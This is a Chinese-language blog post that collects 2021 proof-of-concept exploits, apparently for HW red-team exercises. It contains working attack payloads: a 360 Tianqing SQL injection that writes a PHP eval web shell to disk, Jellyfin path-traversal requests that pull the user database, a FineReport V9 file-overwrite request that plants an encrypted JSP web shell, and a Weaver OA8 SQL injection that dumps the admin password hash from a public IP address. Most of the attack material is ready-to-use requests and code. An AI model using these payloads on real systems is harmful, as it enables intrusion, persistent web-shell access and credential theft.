<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2021HW漏洞 | Harbor</title><meta name="keywords" content="2021,poc"><meta name="author" content="Harbor"><meta name="copyright" content="Harbor"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="360天擎-前台sql注入poc注入写shell: https:&#x2F;&#x2F;192.168.24.196:8443&#x2F;api&#x2F;dp&#x2F;rptsvcsyncpoint?ccid&#x3D;1&#39;;create table O(T TEXT);insert into O(T) values(&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;);copy O(T) to &#39;C:\">
<meta property="og:type" content="article">
<meta property="og:title" content="2021HW漏洞">
<meta property="og:url" content="https://harbors.vip/post/67da50f7.html">
<meta property="og:site_name" content="Harbor">
<meta property="og:description" content="360天擎-前台sql注入poc注入写shell: https:&#x2F;&#x2F;192.168.24.196:8443&#x2F;api&#x2F;dp&#x2F;rptsvcsyncpoint?ccid&#x3D;1&#39;;create table O(T TEXT);insert into O(T) values(&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;);copy O(T) to &#39;C:\">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-04-25T08:41:00.000Z">
<meta property="article:modified_time" content="2021-04-26T06:49:26.670Z">
<meta property="article:author" content="Harbor">
<meta property="article:tag" content="2021">
<meta property="article:tag" content="poc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://harbors.vip/post/67da50f7"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: {"text":"富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善","fontSize":"15px"},
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-04-26 14:49:26'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/TX.jpg" onerror="onerror=null;src='/img/404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Harbor</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">2021HW漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-25T08:41:00.000Z" title="发表于 2021-04-25 16:41:00">2021-04-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-26T06:49:26.670Z" title="更新于 2021-04-26 14:49:26">2021-04-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2021/">2021</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2021/HW/">HW</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="360天擎-前台sql注入"><a href="#360天擎-前台sql注入" class="headerlink" title="360天擎-前台sql注入"></a>360天擎-前台sql注入</h1><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>注入写shell:
https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1&#39;;create table O(T TEXT);insert into O(T) values(&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;);copy O(T) to &#39;C:\Program Files (x86)\360\skylar6\www\1.php&#39;;drop table O;-- </code></pre>
<p>利用过程:<br>1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell<br>2. 通过注入点，创建一张表 O<br>3. 为 表O 添加一个新字段 T 并且写入shell内容<br>4. Postgres数据库 使用COPY TO把一个表的所有内容都拷贝到一个文件(完成写shell)<br>5. 删除 表O </p>
<pre><code>shell地址:
    https://192.168.24.196:8443/1.php
    POST
        1=phpinfo();</code></pre>
<h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><p><img src="/image/360%E5%A4%A9%E6%93%8E-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/4.png"></p>
<p><img src="/image/360%E5%A4%A9%E6%93%8E-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/5.png"></p>
<p><img src="/image/360%E5%A4%A9%E6%93%8E-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/6.png"></p>
<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>天擎默认安装位置: C:\Program Files (x86)\360\skylar6\</p>
<p>首先打开：C:\Program Files (x86)\360\skylar6\www\data\adminlog_path_dict.json 该路径存放了大量的接口地址，并且可以该文件已列出是否开放接口</p>
<p><img src="/image/360%E5%A4%A9%E6%93%8E-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/1.png"></p>
<p>那么重点先查看一下这些开放的端口即可</p>
<p>其中盯上了一个接口：api/dp/rptsvcsyncpoint</p>
<p>通过查看yii手册知道了路由走向，接口文件地址：C:\Program Files (x86)\360\skylar6\www\application\api\controllers\DpController.php</p>
<p><img src="/image/360%E5%A4%A9%E6%93%8E-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/2.png"></p>
<p>进来以后看到它接收了 <code>$cc_id = $this-&gt;getParam(&quot;ccid&quot;)</code> 并且被 <code>getSyncPoint()</code> 方法接收</p>
<p>跟进去<code>getSyncPoint()</code>方法 地址为: C:\Program Files (x86)\360\skylar6\www\source\domain\dao\DataPortalDao.php</p>
<p><img src="/image/360%E5%A4%A9%E6%93%8E-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/3.jpg"></p>
<h1 id="Jellyfin未授权任意文件读取-CVE-2021-21402"><a href="#Jellyfin未授权任意文件读取-CVE-2021-21402" class="headerlink" title="Jellyfin未授权任意文件读取 - CVE-2021-21402"></a>Jellyfin未授权任意文件读取 - CVE-2021-21402</h1><h2 id="漏洞披露时间线"><a href="#漏洞披露时间线" class="headerlink" title="漏洞披露时间线"></a>漏洞披露时间线</h2><ul>
<li>  2021-03-19: 向官方报告了该问题。</li>
<li>  2021-03-22: 发布包含修复程序版本10.7.1。</li>
</ul>
<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>Jellyfin允许读取未经身份验证的任意文件。</p>
<h2 id="影响产品"><a href="#影响产品" class="headerlink" title="影响产品"></a>影响产品</h2><p>Jellyfin</p>
<h2 id="测试版本"><a href="#测试版本" class="headerlink" title="测试版本"></a>测试版本</h2><p>10.7.0及之前版本</p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="问题-1-Audio-itemId-hls-segmentId-stream-mp3和-Audio-itemId-hls-segmentId-stream-aac未授权任意文件读取"><a href="#问题-1-Audio-itemId-hls-segmentId-stream-mp3和-Audio-itemId-hls-segmentId-stream-aac未授权任意文件读取" class="headerlink" title="问题 1:  /Audio/itemId/hls/segmentId/stream.mp3和 /Audio/itemId/hls/segmentId/stream.aac未授权任意文件读取"></a>问题 1:  <code>/Audio/itemId/hls/segmentId/stream.mp3</code>和 <code>/Audio/itemId/hls/segmentId/stream.aac</code>未授权任意文件读取</h3><p>针对Windows系统，在<code>/Audio/&#123;Id&#125;/hls/&#123;segmentId&#125;/stream.mp3</code>和<code>/Audio/&#123;Id&#125;/hls/&#123;segmentId&#125;/stream.aac</code>这两个路径中，存在未经验证的任意文件读取[1]。可以使用Windows路径分割符（URL编码为%5c）将路由的{segmentId}部分设置为相对或绝对路径。最开始，攻击者似乎只能读取以<code>.mp3</code>和<code>.aac</code>[2]结尾的文件，但是，通过在URL路径中使用斜杠，可以使<code>Path.GetExtension（Request.Path）</code>返回空扩展名，从而获得对目标文件路径的完全控制， itemId在整个流程中并没有被使用。该问题不仅限于Jellyfin文件，还能够从文件系统读取任何文件。</p>
<pre><code>// 由于看到一些来自Chrome的请求而没有完整的查询字符串，因此目前尚无法进行身份验证
// [Authenticated] // [1]
[HttpGet(&quot;Audio/&#123;itemId&#125;/hls/&#123;segmentId&#125;/stream.mp3&quot;, Name = &quot;GetHlsAudioSegmentLegacyMp3&quot;)]
[HttpGet(&quot;Audio/&#123;itemId&#125;/hls/&#123;segmentId&#125;/stream.aac&quot;, Name = &quot;GetHlsAudioSegmentLegacyAac&quot;)]
//...
public ActionResult GetHlsAudioSegmentLegacy([FromRoute, Required] string itemId, [FromRoute, Required] string segmentId)
&#123;
    // TODO：不推荐使用新的iOS应用
    var file = segmentId + Path.GetExtension(Request.Path); //[2]
    file = Path.Combine(_serverConfigurationManager.GetTranscodePath(), file);

    return FileStreamResponseHelpers.GetStaticFileResult(file, MimeTypes.GetMimeType(file)!, false, HttpContext);
&#125;</code></pre>
<p>例如，以下请求将从服务器上下载jellyfin.db数据库和密码：</p>
<pre><code>GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1</code></pre>
<h4 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h4><p>此问题可能导致未经授权的系统访问，尤其是当Jellyfin配置为<a target="_blank" rel="noopener" href="https://jellyfin.org/docs/general/networking/index.html#running-jellyfin-behind-a-reverse-proxy">可从Internet访问时</a>。</p>
<h3 id="问题-2-Videos-Id-hls-PlaylistId-SegmentId-SegmentContainer未授权任意文件读取"><a href="#问题-2-Videos-Id-hls-PlaylistId-SegmentId-SegmentContainer未授权任意文件读取" class="headerlink" title="问题 2:  /Videos/Id/hls/PlaylistId/SegmentId.SegmentContainer未授权任意文件读取"></a>问题 2:  <code>/Videos/Id/hls/PlaylistId/SegmentId.SegmentContainer</code>未授权任意文件读取</h3><p><code>/Videos/&#123;Id&#125;/hls/&#123;PlaylistId&#125;/&#123;SegmentId&#125;.&#123;SegmentContainer&#125;</code>路由允许在Windows上读取未经身份验证的任意文件[1]。可以使用Windows路径分隔符（URL编码为％5C）将路由的<code>&#123;SegmentId&#125;.&#123;SegmentContainer&#125;</code>部分设置为相对或绝对路径。来自Path的<code>SegmentId</code>和文件扩展名是串联的[2]。生成的文件用作<code>Path.Combine</code>[3]的第二个参数。但是，如果第二个参数是绝对路径，则<code>Path.Combine</code>的第一个参数将被忽略，并且生成的路径仅是绝对路径文件。</p>
<p>攻击的先决条件是<code>jellyfin/transcodes</code>目录包含至少一个.m3u8文件[4]（即，某些用户开始流式传输视频，或者自上次流式传输以来一直保留在那里）。 itemId并没有被使用，并且PlaylistId必须是m3u8文件的子字符串。它可以仅仅是<code>m</code>，因为它始终位于* .m3u8文件名中</p>
<pre><code>// 由于看到一些来自Chrome的请求而没有完整的查询字符串，因此目前尚无法进行身份验证
// [Authenticated] //[1]
[HttpGet(&quot;Videos/&#123;itemId&#125;/hls/&#123;playlistId&#125;/&#123;segmentId&#125;.&#123;segmentContainer&#125;&quot;)]
//...
public ActionResult GetHlsVideoSegmentLegacy(
    [FromRoute, Required] string itemId,
    [FromRoute, Required] string playlistId,
    [FromRoute, Required] string segmentId,
    [FromRoute, Required] string segmentContainer)
&#123;
    var file = segmentId + Path.GetExtension(Request.Path); //[2]
    var transcodeFolderPath = _serverConfigurationManager.GetTranscodePath();

    file = Path.Combine(transcodeFolderPath, file); //[3]

    var normalizedPlaylistId = playlistId;

    var filePaths = _fileSystem.GetFilePaths(transcodeFolderPath);
    // 添加.来分割容器供之后使用
    segmentContainer = segmentContainer.Insert(0, &quot;.&quot;);
    string? playlistPath = null;
    foreach (var path in filePaths)
    &#123;
        var pathExtension = Path.GetExtension(path);
        if ((string.Equals(pathExtension, segmentContainer, StringComparison.OrdinalIgnoreCase)
                || string.Equals(pathExtension, &quot;.m3u8&quot;, StringComparison.OrdinalIgnoreCase)) //[4]
            &amp;&amp; path.IndexOf(normalizedPlaylistId, StringComparison.OrdinalIgnoreCase) != -1) //[5]
        &#123;
            playlistPath = path;
            break;
        &#125;
    &#125;

    return playlistPath == null
        ? NotFound(&quot;Hls segment not found.&quot;)
        : GetFileResult(file, playlistPath);
&#125;</code></pre>
<p>PoC:</p>
<pre><code>GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1</code></pre>
<h4 id="影响-1"><a href="#影响-1" class="headerlink" title="影响"></a>影响</h4><p>此问题可能导致未经授权的系统访问，尤其是当Jellyfin配置为<a target="_blank" rel="noopener" href="https://jellyfin.org/docs/general/networking/index.html#running-jellyfin-behind-a-reverse-proxy">可从Internet访问时</a>。</p>
<h3 id="问题-3-Videos-Id-hls-PlaylistId-stream-m3u8已授权的任意文件读取"><a href="#问题-3-Videos-Id-hls-PlaylistId-stream-m3u8已授权的任意文件读取" class="headerlink" title="问题 3: /Videos/Id/hls/PlaylistId/stream.m3u8已授权的任意文件读取"></a>问题 3: <code>/Videos/Id/hls/PlaylistId/stream.m3u8</code>已授权的任意文件读取</h3><p><code>/Videos/&#123;Id&#125;/hls/&#123;PlaylistId&#125;/stream.m3u8</code>允许在Windows上读取任意文件。在这种情况下，它需要身份验证。攻击者似乎只能读取以.m3u8 [1]结尾的文件。但是，通过在URL路径中使用斜杠，可以使<code>Path.GetExtension（Request.Path）</code>返回空扩展名，从而获得对结果文件路径的完全控制。 itemId并没有被使用。</p>
<pre><code>[HttpGet(&quot;Videos/&#123;itemId&#125;/hls/&#123;playlistId&#125;/stream.m3u8&quot;)]
[Authorize(Policy = Policies.DefaultAuthorization)]
//...
public ActionResult GetHlsPlaylistLegacy([FromRoute, Required] string itemId, [FromRoute, Required] string playlistId)
&#123;
    var file = playlistId + Path.GetExtension(Request.Path); //[1]
    file = Path.Combine(_serverConfigurationManager.GetTranscodePath(), file);

    return GetFileResult(file, file);
&#125;</code></pre>
<p>PoC:</p>
<pre><code>GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1</code></pre>
<h4 id="影响-2"><a href="#影响-2" class="headerlink" title="影响"></a>影响</h4><p> 此问题可能导致权限提升。</p>
<h3 id="问题-4-Images-Ratings-theme-name-Images-MediaInfo-theme-name-和-Images-General-name-type未授权任意图像文件读取"><a href="#问题-4-Images-Ratings-theme-name-Images-MediaInfo-theme-name-和-Images-General-name-type未授权任意图像文件读取" class="headerlink" title="问题 4: /Images/Ratings/theme/name, /Images/MediaInfo/theme/name 和 Images/General/name/type未授权任意图像文件读取"></a>问题 4: <code>/Images/Ratings/theme/name</code>, <code>/Images/MediaInfo/theme/name</code> 和 <code>Images/General/name/type</code>未授权任意图像文件读取</h3><p><code>/Images/Ratings/&#123;theme&#125;/&#123;name&#125;</code>，<code>/Images/MediaInfo/&#123;theme&#125;/&#123;name&#125;</code>和<code>/Images/General/&#123;name&#125;/&#123;type&#125;</code>路由允许在Windows上读取未经身份验证的任意图像文件。可以使用Windows路径分隔符（对URL进行编码时为％5C）将路径的<code>&#123;theme&#125;</code>[1]或<code>&#123;name&#125;</code>[2]部分设置为相对或绝对路径。该路由会自动附加以下允许的扩展名，因此只能读取图像文件[3]：<code>. png</code>，<code>.jpg</code>，<code>.jpeg</code>，<code>.tbn</code>，<code>.gif</code>。</p>
<pre><code>[HttpGet(&quot;MediaInfo/&#123;theme&#125;/&#123;name&#125;&quot;)]
[AllowAnonymous]
//...
public ActionResult GetMediaInfoImage(
    [FromRoute, Required] string theme,
    [FromRoute, Required] string name)
&#123;
    return GetImageFile(_applicationPaths.MediaInfoImagesPath, theme, name);
&#125;
//...
private ActionResult GetImageFile(string basePath, string theme, string? name)
&#123;
    var themeFolder = Path.Combine(basePath, theme); //[1]
    if (Directory.Exists(themeFolder))
    &#123;
        var path = BaseItem.SupportedImageExtensions.Select(i =&gt; Path.Combine(themeFolder, name + i)/*[2]*/) //[3]
            .FirstOrDefault(System.IO.File.Exists);

        if (!string.IsNullOrEmpty(path) &amp;&amp; System.IO.File.Exists(path))
        &#123;
            var contentType = MimeTypes.GetMimeType(path);
            return PhysicalFile(path, contentType);
        &#125;
    &#125;</code></pre>
<p>PoCs ：下载 <code>c:\temp\filename.jpg</code>:</p>
<pre><code>GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1
GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1</code></pre>
<h4 id="影响-3"><a href="#影响-3" class="headerlink" title="影响"></a>影响</h4><p>此问题可能导致未授权访问图像文件，尤其是在将Jellyfin配置为<a target="_blank" rel="noopener" href="https://jellyfin.org/docs/general/networking/index.html#running-jellyfin-behind-a-reverse-proxy">可从Internet访问时</a>。</p>
<h3 id="问题-5-Videos-itemId-Subtitles经身份验证的文件上传（不限于Windows）"><a href="#问题-5-Videos-itemId-Subtitles经身份验证的文件上传（不限于Windows）" class="headerlink" title="问题 5: /Videos/itemId/Subtitles经身份验证的文件上传（不限于Windows）"></a>问题 5: <code>/Videos/itemId/Subtitles</code>经身份验证的文件上传（不限于Windows）</h3><p><code>Videos/&#123;itemId&#125;/Subtitles</code> 允许高级用户覆盖任意文件。由于它需要管理员权限，因此尚不清楚它是否跨越安全边界。</p>
<p>PoC:</p>
<pre><code>POST /Videos/d7634eb0064cce760f3f0bf8282c16cd/Subtitles HTTP/1.1
...
X-Emby-Authorization: MediaBrowser DeviceId=&quot;...&quot;, Version=&quot;10.7.0&quot;, Token=&quot;...&quot;
...

&#123;&quot;language&quot;:&quot;.\\..\\&quot;,&quot;format&quot;:&quot;.\\..\\test.bin&quot;,&quot;isForced&quot;:false,&quot;data&quot;:&quot;base64 encoded data&quot;&#125;</code></pre>
<h4 id="影响-4"><a href="#影响-4" class="headerlink" title="影响"></a>影响</h4><p>此问题可能导致验证后的任意远程代码执行。</p>
<h2 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h2><ul>
<li>  CVE-2021-21402</li>
</ul>
<h1 id="帆软-V9getshell-FineReport-V9"><a href="#帆软-V9getshell-FineReport-V9" class="headerlink" title="帆软 V9getshell FineReport V9"></a>帆软 V9getshell FineReport V9</h1><p>注意: 这个漏洞是任意文件覆盖，上传 JSP 马，需要找已存在的 jsp 文件进行覆盖 Tomcat 启动帆软后默认存在的 JSP 文件: 比如：/tomcat-7.0.96/webapps/ROOT/index.jsp 覆盖 Tomcat 自带 ROOT 目录下的 index.jsp:</p>
<pre><code>POST  /WebReport/ReportServer?  
op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
Host:  192.168.169.138:8080
User-Agent:  Mozilla/5.0  (Windows  NT  10.0;  Win64;  x64)  AppleWebKit/537.36  (KHTML,  like  Gecko)  
Chrome/81.0.4044.92  Safari/537.36
Connection:  close
Accept-Au:  0c42b2f264071be0507acea1876c74
Content-Type:  text/xml;charset=UTF-8
Content-Length:  675 
&#123;&quot;__CONTENT__&quot;:&quot;&lt;%@page  import=\&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*\&quot;%&gt;&lt;%!class  U  extends  
ClassLoader&#123;U(ClassLoader  c)&#123;super(c);&#125;public  Class  g(byte  []b)&#123;return  
super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(\&quot;pass\&quot;)!=null)  &#123;String  
k=(\&quot;\&quot;+UUID.randomUUID()).replace(\&quot;-
\&quot;,\&quot;\&quot;).substring(16);session.putValue(\&quot;u\&quot;,k);out.print(k);return;&#125;Cipher  
c=Cipher.getInstance(\&quot;AES\&quot;);c.init(2,new  
SecretKeySpec((session.getValue(\&quot;u\&quot;)+\&quot;\&quot;).getBytes(),\&quot;AES\&quot;));new  
U(this.getClass().getClassLoader()).g(c.doFinal(new  
sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta  
nce().equals(pageContext);%&gt;&quot;,&quot;__CHARSET__&quot;:&quot;UTF-8&quot;&#125;</code></pre>
<p><img src="/image/2021.4.8%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/640.png" alt="图片"></p>
<h1 id="泛微OA8前台SQL注入"><a href="#泛微OA8前台SQL注入" class="headerlink" title="泛微OA8前台SQL注入"></a>泛微OA8前台SQL注入</h1><p>漏洞URL：</p>
<pre><code>http://106.15.190.147/js/hrm/getdata.jsp?cmd=getSelectAllId&amp;sql=***注入点</code></pre>
<p>在getdata.jsp中，直接将request对象交给<code>weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext)</code> : 方法处理</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%871.png"></p>
<p>在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%872.png"></p>
<p>Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象)<br>在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进<code>getSelectAllIds（sql,type）</code>方法中</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%873.png"></p>
<p>在getSelectAllIds（sql,type）方法中，直接将sql参数的值，传递进数据库执行，并判断type的值是否等于5，如果等于5，获取查询结果的requestId字段，否则获取查询结果的id字段<br>到此，参数从URL，一直到数据库被执行</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%874.png"></p>
<p>根据以上代码流程，只要构造请求参数<br><code>?cmd= getSelectAllId&amp;sql=select password as id from userinfo;</code><br>即可完成对数据库操控<br>在浏览器中，构造测试URL：<br><code>http://106.15.190.147/js/hrm/getdata.jsp?cmd=getSelectAllId&amp;sql=select%201234%20as%20id</code><br>页面显示1234</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%875.png"></p>
<p>使用payload：<br><code>Select password as id from HrmResourceManager</code></p>
<pre><code>http://106.15.190.147/js/hrm/getdata.jsp?cmd=getSelectAllId&amp;sql=select%20password%20as%20id%20from%20HrmResourceManager</code></pre>
<p>查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password）</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%876.png"></p>
<p>对密文进行md5对比：</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%877.png"></p>
